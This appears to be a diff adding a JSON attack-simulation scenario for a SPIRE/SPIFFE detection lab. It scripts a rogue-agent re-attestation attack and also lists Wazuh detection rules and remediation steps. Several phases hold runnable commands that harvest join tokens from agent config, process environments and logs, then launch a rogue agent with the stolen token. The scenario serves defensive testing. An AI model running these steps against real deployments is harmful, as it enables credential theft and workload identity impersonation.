@@ -1,0 +1,215 @@
+{
+  "id": "S7-09",
+  "name": "Agent Re-attestation Abuse",
+  "category": "SPIFFE/SPIRE",
+  "version": "1.0",
+  "description": "Simulate a rogue SPIRE agent attempting to re-attest with stolen join tokens or node attestation data, gaining control over workload identity issuance on a node",
+  "difficulty": "Expert",
+  "real_world_relevance": "Join tokens are single-use but may be logged, cached, or exposed in environment variables. An attacker who recovers a join token or node attestation material can impersonate a SPIRE agent and serve arbitrary SVIDs to workloads on the compromised node.",
+
+  "mitre_attack": {
+    "tactics": ["Credential Access", "Lateral Movement", "Persistence"],
+    "techniques": [
+      {"id": "T1078", "name": "Valid Accounts"},
+      {"id": "T1550", "name": "Use Alternate Authentication Material"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["spire-server", "spire-agent", "k8s-node-1"],
+    "network": "k8s_net",
+    "profile": "k8s"
+  },
+
+  "attack_flow": {
+    "description": "Attacker extracts join token or node attestation material from a legitimate SPIRE agent, then starts a rogue agent that re-attests to the SPIRE Server and takes over workload identity issuance",
+    "diagram": [
+      "1. Extract join token from legitimate SPIRE agent environment, config, or logs",
+      "2. Enumerate SPIRE agent configuration to understand attestation method",
+      "3. Interfere with legitimate agent (stop, kill, or race condition)",
+      "4. Prepare rogue agent configuration using stolen attestation material",
+      "5. Start rogue agent that re-attests to SPIRE Server",
+      "6. Rogue agent receives agent SVID and begins serving workload SVIDs",
+      "7. All workloads on the node now receive SVIDs from the rogue agent"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Credential Extraction",
+      "description": "Extract join token and attestation configuration from the legitimate SPIRE agent",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "cat /opt/spire/agent/agent.conf | grep -A5 'join_token\\|attestation'",
+          "description": "Extract join token and attestation configuration from agent config"
+        },
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "strings /proc/*/environ 2>/dev/null | grep -i 'join.token\\|SPIRE' || echo 'No tokens found in process environment'",
+          "description": "Search process environment variables for leaked join tokens"
+        },
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "grep -r 'join_token' /opt/spire/agent/logs/ /var/log/spire/ 2>/dev/null || echo 'No tokens found in logs'",
+          "description": "Search agent logs for join tokens that may have been logged"
+        }
+      ]
+    },
+    {
+      "name": "Agent Enumeration",
+      "description": "Enumerate the current SPIRE agent state and registered agents on the server",
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-server",
+          "command": "/opt/spire/bin/spire-server agent list -socketPath /tmp/spire-server/private/api.sock",
+          "description": "List all registered agents to identify the target agent's SPIFFE ID and attestation type"
+        },
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "cat /opt/spire/agent/agent.conf",
+          "description": "Read full agent configuration including server address, trust domain, and plugin config"
+        }
+      ]
+    },
+    {
+      "name": "Rogue Agent Preparation",
+      "description": "Create a rogue agent configuration using stolen attestation material",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "cat > /tmp/rogue-agent.conf << 'CONF'\nagent {\n  data_dir = \"/tmp/rogue-spire-agent\"\n  log_level = \"DEBUG\"\n  server_address = \"spire-server\"\n  server_port = \"8081\"\n  socket_path = \"/tmp/rogue-agent.sock\"\n  trust_domain = \"example.org\"\n}\n\nplugins {\n  NodeAttestor \"join_token\" {\n    plugin_data {\n    }\n  }\n  KeyManager \"disk\" {\n    plugin_data {\n      directory = \"/tmp/rogue-spire-agent\"\n    }\n  }\n  WorkloadAttestor \"unix\" {\n    plugin_data {\n    }\n  }\n}\nCONF",
+          "description": "Write rogue agent config that will re-attest using stolen join token"
+        },
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "mkdir -p /tmp/rogue-spire-agent",
+          "description": "Create data directory for the rogue agent"
+        }
+      ]
+    },
+    {
+      "name": "Rogue Agent Launch",
+      "description": "Launch the rogue agent and verify it successfully attests to the SPIRE Server",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "/opt/spire/bin/spire-agent run -config /tmp/rogue-agent.conf -joinToken STOLEN_TOKEN &",
+          "description": "Start rogue agent with stolen join token (STOLEN_TOKEN is a placeholder for the extracted token)"
+        },
+        {
+          "type": "exec",
+          "target": "spire-server",
+          "command": "/opt/spire/bin/spire-server agent list -socketPath /tmp/spire-server/private/api.sock",
+          "description": "Verify rogue agent appears in the server's agent list after re-attestation"
+        }
+      ]
+    },
+    {
+      "name": "Impact Verification",
+      "description": "Confirm the rogue agent can issue SVIDs to workloads",
+      "actions": [
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "/opt/spire/bin/spire-agent api fetch x509 -socketPath /tmp/rogue-agent.sock 2>&1 || echo 'SVID fetch attempted via rogue agent socket'",
+          "description": "Attempt to fetch an X.509 SVID from the rogue agent's workload API"
+        },
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "/opt/spire/bin/spire-agent healthcheck -socketPath /tmp/rogue-agent.sock 2>&1 || echo 'Rogue agent healthcheck attempted'",
+          "description": "Check rogue agent health status to confirm it is operational"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "SPIRE Server Audit",
+      "description": "Agent attestation or re-attestation event detected (AttestAgent API call in server audit log)",
+      "wazuh_rule": "101040"
+    },
+    {
+      "type": "SPIRE Agent Log",
+      "description": "Agent-side attestation success event indicating new or re-attested agent",
+      "wazuh_rule": "101044"
+    },
+    {
+      "type": "File Integrity Monitoring",
+      "description": "SPIRE agent configuration file created or modified outside normal deployment process",
+      "wazuh_rule": "101042"
+    },
+    {
+      "type": "Process Monitoring",
+      "description": "Multiple spire-agent processes running on the same node or unexpected spire-agent process launch",
+      "wazuh_rule": "101040"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "101040",
+      "level": 10,
+      "description": "NHI-SPIRE: Agent attestation/re-attestation event detected (server audit)"
+    },
+    {
+      "rule_id": "101044",
+      "level": 10,
+      "description": "NHI-SPIRE: Agent attestation/re-attestation event detected (agent log)"
+    },
+    {
+      "rule_id": "101042",
+      "level": 12,
+      "description": "NHI-SPIRE: Configuration file modified"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Evict the rogue agent using spire-server agent evict -spiffeID <rogue-agent-id>",
+      "Kill the rogue spire-agent process on the compromised node",
+      "Rotate all SVIDs that may have been issued by the rogue agent",
+      "Revoke the compromised join token if it has not already been consumed"
+    ],
+    "long_term": [
+      "Migrate from join_token attestation to stronger methods (k8s_psat, aws_iid, tpm) that cannot be replayed",
+      "Enable SPIRE Server agent banning for evicted agents to prevent re-attestation",
+      "Set AgentTTL to short durations to limit the window of rogue agent activity",
+      "Monitor for multiple agent attestation events from the same node in short time windows",
+      "Restrict join token generation to CI/CD pipelines with short TTLs",
+      "Enable SPIRE Server audit logging and forward AttestAgent events to SIEM"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "SPIRE Node Attestation Documentation",
+      "url": "https://spiffe.io/docs/latest/spire/using/node_attestation/"
+    },
+    {
+      "title": "SPIRE Join Token Attestor",
+      "url": "https://github.com/spiffe/spire/blob/main/doc/plugin_agent_nodeattestor_jointoken.md"
+    },
+    {
+      "title": "MITRE ATT&CK T1550 - Use Alternate Authentication Material",
+      "url": "https://attack.mitre.org/techniques/T1550/"
+    },
+    {
+      "title": "SPIRE Agent Management and Eviction",
+      "url": "https://spiffe.io/docs/latest/deploying/spire_agent/"
+    }
+  ]
+}
